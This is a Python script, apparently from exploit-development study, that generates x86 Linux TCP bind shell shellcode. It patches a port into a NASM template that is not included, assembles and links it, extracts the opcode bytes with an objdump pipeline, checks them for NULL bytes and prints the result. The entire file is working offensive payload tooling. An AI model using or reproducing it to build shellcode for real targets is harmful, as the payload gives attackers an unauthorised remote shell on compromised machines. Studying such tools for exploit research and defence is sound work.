#!/usr/bin/python3

import argparse
import sys
import os
import socket

def set_port(port):
	port = hex(socket.htons(port))
	asm = open("tcp_bind_shell_x86.nasm", 'rt')
	data = asm.read()
	data = data.replace('PORT', port)
	asm.close()
	asm = open('tmp.nasm', 'wt')
	asm.write(data)
	asm.close()

def gen_shellcode():
	stream = os.popen("""objdump -d tcp_bind_shell_x86 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'""")
	shellcode = stream.read().rstrip()
	return shellcode

def print_shellcode(shellcode, port):
	print("[*] Generating shellcode for TCP bind shell on port %s" % port)
	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
	print(shellcode)

def main():

	parser = argparse.ArgumentParser(description='Generate x86 TCP bind shell shellcode.')
	parser.add_argument('-p', '--port', type=int, help='Local port for TCP bind shell to listen on.')
	
	args = parser.parse_args()
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()

	# Modify the port in tcp_bind_shell.nasm
	set_port(args.port)
	
	# Link and assemble code
	os.system('nasm -f elf32 -o tcp_bind_shell_x86.o tmp.nasm')
	os.system('ld -o tcp_bind_shell_x86 tcp_bind_shell_x86.o')
	
	# Dump the shellcode using objdump
	shellcode = gen_shellcode()

	# Print shellcode
	print_shellcode(shellcode, args.port)

	# Cleanup
	os.system('rm tmp.nasm')
	os.system('rm tcp_bind_shell_x86.o')
	os.system('rm tcp_bind_shell_x86')

if __name__ == "__main__":
	main()
